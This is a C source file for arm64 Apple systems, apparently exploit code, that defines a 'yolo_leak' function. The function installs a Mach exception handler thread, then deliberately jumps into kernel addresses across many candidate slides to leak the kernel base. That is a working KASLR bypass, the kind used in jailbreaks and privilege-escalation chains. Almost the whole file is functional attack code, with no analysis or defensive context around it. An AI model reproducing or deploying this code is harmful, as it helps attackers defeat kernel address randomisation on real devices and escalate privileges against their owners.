#include <pthread.h>
#include <stdint.h>
#include <mach/mach.h>

extern uint64_t jumpto(uint64_t addr);
__asm__
(
    "_jumpto:\n"
    "   mov x17, x30\n"
    "   br x0\n"
);

static void* catcher(void *arg)
{
    mach_port_t port = *(mach_port_t*)arg;
    task_t self = mach_task_self();
    while(1)
    {
#pragma pack(4)
        typedef struct
        {
            mach_msg_header_t head;
            mach_msg_body_t body;
            mach_msg_port_descriptor_t thread;
            mach_msg_port_descriptor_t task;
            NDR_record_t NDR;
            exception_type_t exception;
            mach_msg_type_number_t codeCnt;
            integer_t code[2];
            int flavor;
            mach_msg_type_number_t stateCnt;
            _STRUCT_ARM_THREAD_STATE64 state;
            mach_msg_trailer_t trailer;
        } Request;
        typedef struct {
            mach_msg_header_t head;
            NDR_record_t NDR;
            kern_return_t RetCode;
            int flavor;
            mach_msg_type_number_t stateCnt;
            _STRUCT_ARM_THREAD_STATE64 state;
        } Reply;
#pragma pack()
        Request req = {};
        kern_return_t ret = mach_msg(&req.head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, (mach_msg_size_t)sizeof(req), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(ret != KERN_SUCCESS)
        {
            break;
        }
        mach_port_deallocate(self, req.thread.name);
        mach_port_deallocate(self, req.task.name);

        Reply rep = {};
        rep.head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req.head.msgh_bits), 0);
        rep.head.msgh_remote_port = req.head.msgh_remote_port;
        rep.head.msgh_size = (mach_msg_size_t)sizeof(rep);
        rep.head.msgh_local_port = MACH_PORT_NULL;
        rep.head.msgh_id = req.head.msgh_id + 100;
        rep.head.msgh_reserved = 0;
        rep.NDR = NDR_record;
        rep.RetCode = KERN_SUCCESS;
        rep.flavor = req.flavor;
        rep.stateCnt = req.stateCnt;
        rep.state = req.state;
        if(req.exception != 2)
        {
            rep.state.__x[0] = 0x0;
        }
        rep.state.__opaque_pc = (void*)req.state.__x[17];

        ret = mach_msg(&rep.head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(rep), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(ret != KERN_SUCCESS)
        {
            break;
        }
    }
    return NULL;
}

uint64_t yolo_leak(void)
{
    kern_return_t ret;
    mach_port_t exc_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
    if(ret != KERN_SUCCESS) return 0;
    ret = mach_port_insert_right(mach_task_self(), exc_port, exc_port, MACH_MSG_TYPE_MAKE_SEND);
    if(ret != KERN_SUCCESS) return 0;
    ret = thread_set_exception_ports(mach_thread_self(), EXC_MASK_ALL, exc_port, EXCEPTION_STATE_IDENTITY, ARM_THREAD_STATE64);
    if(ret != KERN_SUCCESS) return 0;

    pthread_t thread;
    if(pthread_create(&thread, NULL, &catcher, &exc_port) == 0)
    {
        pthread_detach(thread);
    }

    for(uint64_t i = 0; i < 0x3fe3ff; ++i)
    {
        // Add 0xf00 to kernel base to be sure to jump to zeroes
        uint64_t x = jumpto(0xfffffff007004f00 + (i << 14));
        if(x)
        {
            x &= ~ 0xfff;
            return x;
        }
    }

    return 0;
}
